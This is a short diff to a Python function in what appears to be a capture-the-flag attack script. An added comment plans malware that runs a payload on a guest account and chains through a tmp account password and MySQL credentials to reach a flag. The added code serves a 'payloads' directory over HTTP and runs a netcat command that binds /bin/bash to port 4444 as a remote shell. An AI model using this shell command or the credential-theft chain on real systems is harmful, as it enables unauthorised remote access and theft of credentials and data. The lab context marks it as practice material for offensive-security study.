@@ -27,12 +27,19 @@ def somerandomcode1():
     csi = cs()
     tfi = tf()
     ori = Or()
+
     ###so it turns out you can in fact LOTL in Marlin, executing with noexec is totally possible, in both python and bash. 
     # I've saved a snapshot of exactly how it is right now, and ill be writing bash/python malware to explore 
     # this further. The next steps will be to write a python script that will execute a payload on the guest 
     # account, and then use that to get the tmp account password, and then use that to get the mysql credentials, 
     # and then use those to get the mysql database, and then use that to get the flag.
+    
     print("[*] Is it someone new?")
+    nri.stop_server()
+    nri.create_server("payloads", 8000)
+    time.sleep(60)
+    csi.speak("Executing payload on target machine...")
+    csi.execute_command("nc -l :4444 -e /bin/bash")
 
     
 
